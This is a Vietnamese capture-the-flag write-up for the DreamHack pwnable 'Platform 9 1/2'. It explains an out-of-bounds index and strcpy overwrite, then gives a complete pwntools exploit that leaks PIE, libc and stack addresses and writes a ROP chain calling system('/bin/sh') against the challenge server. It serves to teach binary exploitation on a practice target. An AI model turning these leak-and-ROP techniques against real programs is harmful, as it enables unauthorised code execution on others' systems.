# Platform-9-1-2---Write-up-----DreamHack
Hướng dẫn cách giải bài Platform 9 1/2 cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 16/3/2026

## 1. Mục tiêu cần làm
Bài này full lớp bảo vệ nên các bạn khỏi cần check. Giờ chúng ta hãy đọc code thôi.

```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v3; // rax
  _DWORD *v4; // rax
  int v6; // [rsp+Ch] [rbp-F4h] BYREF
  int v7; // [rsp+10h] [rbp-F0h] BYREF
  int i; // [rsp+14h] [rbp-ECh]
  int *v9; // [rsp+18h] [rbp-E8h]
  char *s; // [rsp+20h] [rbp-E0h]
  _DWORD *v11; // [rsp+28h] [rbp-D8h]
  char buf[136]; // [rsp+70h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+F8h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  sub_1229(a1, a2, a3);
  v9 = &dword_4010;
  for ( i = 0; i <= 9; ++i )
    (&s)[i] = (char *)malloc(dword_4010);
  v3 = s;
  *(_QWORD *)s = 0x6F6B6F420A6F6D41LL;
  *((_WORD *)v3 + 4) = 10;
  v4 = v11;
  *v11 = 1684955470;
  *(_DWORD *)((char *)v4 + 3) = 683876;
  sub_1270();
  while ( 1 )
  {
    while ( 1 )
    {
      sub_12A8();
      printf(">> ");
      __isoc99_scanf("%d", &v6);
      if ( v6 != 1 )
        break;
      printf("Enter train number: ");
      __isoc99_scanf("%d", &v7);   // Lỗi OOB
      puts((&s)[v7 - 1]);
    }
    if ( v6 != 2 )
      break;
    printf("Enter train number: ");
    __isoc99_scanf("%d", &v7);
    read(0, buf, (unsigned int)*v9);
    strcpy((&s)[v7 - 1], buf);   // Lỗi OVW
  }
  return 0LL;
}
```

Chúng ta có lỗi **OOB** ở ngay `v7`. Cơ chế nó như sau : nó sẽ `puts` giá trị mà tại địa chỉ `v7-1` trỏ vào. Ví dụ tại vị trí 0 stack đang có địa chỉ là `A` mà `A` lại trỏ vào `B` thì nó sẽ in ra `B`. Vậy thì ta chỉ cần kiểm tra stack xem địa chỉ trỏ vào nào xài được thì sẽ tính toán khoảng cách và in ra.

<img width="865" height="780" alt="Image" src="https://github.com/user-attachments/assets/fbee6531-f0f6-40cd-ab54-c98371a52897" />

Từ `0x7fffffffdbd0` đến `0x7fffffffdc18` chính là biến `s`. Bởi vì 

```C
  for ( i = 0; i <= 9; ++i )
    (&s)[i] = (char *)malloc(dword_4010);
```

Nó khởi tạo 10 lần liên tục với các địa chỉ trỏ vào heap. Vậy thì suy ra khi `0x7fffffffdbd0` chính là cột mốc để ta có thể tính toán `v7`. Ta thấy tại `0x7fffffffdca0` đang chứa `0x7fffffffdd90` mà con trỏ này lại trỏ vào `0x555555555140`. Vậy thì ta chỉ cần tìm được offset đến đây và chọn `View` là có thể leak được PIE.

Leak xong PIE thì tiếp theo là leak libc. Nhìn vào stack ta thấy không có con trỏ nào trỏ vào bất cứ địa chỉ nào thuộc libc hết. Vậy thì ta sẽ sử dụng bug thứ 2 là OVW.

```C
    __isoc99_scanf("%d", &v7);
    read(0, buf, (unsigned int)*v9);
    strcpy((&s)[v7 - 1], buf);
```

Nó sẽ copy tất cả nội dung của `buf` vào vị trí `s[v7-1]` đang trỏ tới. Ta sẽ tận dụng nó làm 2 việc, 1 là leak libc, 2 là ghi ROPchain vào RIP. Ok giờ bắt tay vô làm thôi.

## 2. Cách thực thi
Đầu tiên là leak binary đã. Ta biết được tại `0x7fffffffdca0` chứa con trỏ trỏ vào `0x555555555140`. Vậy thì ta cần tính offset xem `v7` nên là bao nhiêu.

<img width="643" height="49" alt="Image" src="https://github.com/user-attachments/assets/d35339a7-875c-4db2-bba2-c82a500f5cf7" />

Vậy suy ra `v7` sẽ là 27 vì phải -1 nữa.

```Python
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Enter train number:', b'27')
p.recvuntil(b' ')
leak_binary = u64(p.recv(6) + b'\x00\x00')
PIE = leak_binary - 0x1140
log.success(f'Leak Binary : {hex(leak_binary)}')
log.success(f'PIE : {hex(PIE)}')
```

Ok tiếp theo là làm sao leak libc, tận dụng cái lỗi ta đã nói trên. Ta sẽ ghi địa chỉ `puts` vào thằng `buf`. Sau đó tính offset sao cho `v7-1` trỏ vào đó là ta sẽ in được `puts` và tính libc thôi.

```Python
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Enter train number:', b'1')
p.send(p64(exe.got['puts'] + PIE))

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Enter train number:', b'11')
p.recvuntil(b' ')
leak_libc = u64(p.recv(6) + b'\x00\x00')
libc_base = leak_libc - 0x87be0
libc.address = libc_base
log.success(f'Leak Libc : {hex(leak_libc)}')
log.success(f'Libc Base : {hex(libc_base)}')
```

Giờ là lúc khó nhất nè. Ta không thể leak được stack, không thể **BOF** tới RIP được, thế phải làm sao ? Ta sẽ tận dụng lỗi kia lần nữa. Như mình đã nói thì khi xài nó sẽ copy nội dung từ đầu `buf` vào `v7-1` đến khi gặp byte null là dừng. Vậy thì sẽ ra sao nếu ta ghi payload gồm ` Dữ liệu + đích đến ` ?

Nhìn vào stack ta có thể suy luận `s[10]` nó nằm trùng vào đầu `buf`. Vậy thì ta sẽ ghi đích tới vào `s[11]` để khi copy nội dung từ đầu `buf` nó sẽ bỏ vào `s[11]`. Bạn không cần lo lỡ nó ghi dư nội dung vào đích tới đâu, tại vì địa chỉ RIP ta ghi vào thường có đầu là byte null nên sẽ không sao đâu.

Nhưng làm sao để biết ghi vào đâu ? Ta sẽ leak stack từ environ và tính RIP. Ta sẽ sử dụng thủ thuật giống leak binary để leak stack, sau đó tính offset để ra RIP là được.

```Python
environ_libc = libc.sym['environ']
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Enter train number: ', b'1')
p.send(p64(environ_libc))

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Enter train number:', b'11')
p.recvuntil(b' ')
leak_stack = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leak Stack : {hex(leak_stack)}')

ret_addr = leak_stack - 0x130
log.success(f'RIP : {hex(ret_addr)}')
```

Sau khi có được RIP ta sẽ bắt đầu ghi ROPchain vào nó.

```Python
def write_qword(target_addr, data):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Enter train number: ', b'12')
    payload = p64(data) + p64(target_addr)
    p.send(payload)

pop_rdi = libc_base + 0x10f75b
ret = libc_base + 0x2882f
system  = libc.sym['system']
bin_sh  = next(libc.search(b'/bin/sh'))

write_qword(ret_addr,      pop_rdi)
write_qword(ret_addr + 8,  bin_sh)
write_qword(ret_addr + 16, ret)
write_qword(ret_addr + 24, system)
```

Ok vậy là xong. Giờ ta chỉ cần thoát chương trình là chạy được và get shell. Hãy cho mình 1 star để có động lực viết tiếp write up nha 🐧.

## 3. Exploit
```Python
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process('./chall_patched')
p = remote('host3.dreamhack.games', 22867)

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Enter train number:', b'27')
p.recvuntil(b' ')
leak_binary = u64(p.recv(6) + b'\x00\x00')
PIE = leak_binary - 0x1140
log.success(f'Leak Binary : {hex(leak_binary)}')
log.success(f'PIE : {hex(PIE)}')

p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Enter train number:', b'1')
p.send(p64(exe.got['puts'] + PIE))

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Enter train number:', b'11')
p.recvuntil(b' ')
leak_libc = u64(p.recv(6) + b'\x00\x00')
libc_base = leak_libc - 0x87be0
libc.address = libc_base
log.success(f'Leak Libc : {hex(leak_libc)}')
log.success(f'Libc Base : {hex(libc_base)}')

environ_libc = libc.sym['environ']
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Enter train number: ', b'1')
p.send(p64(environ_libc))

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Enter train number:', b'11')
p.recvuntil(b' ')
leak_stack = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leak Stack : {hex(leak_stack)}')

ret_addr = leak_stack - 0x130
log.success(f'RIP : {hex(ret_addr)}')

def write_qword(target_addr, data):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Enter train number: ', b'12')
    payload = p64(data) + p64(target_addr)
    p.send(payload)

pop_rdi = libc_base + 0x10f75b
ret = libc_base + 0x2882f
system  = libc.sym['system']
bin_sh  = next(libc.search(b'/bin/sh'))

write_qword(ret_addr,      pop_rdi)
write_qword(ret_addr + 8,  bin_sh)
write_qword(ret_addr + 16, ret)
write_qword(ret_addr + 24, system)

#p.sendlineafter(b'>> ', b'36')

p.interactive()
```
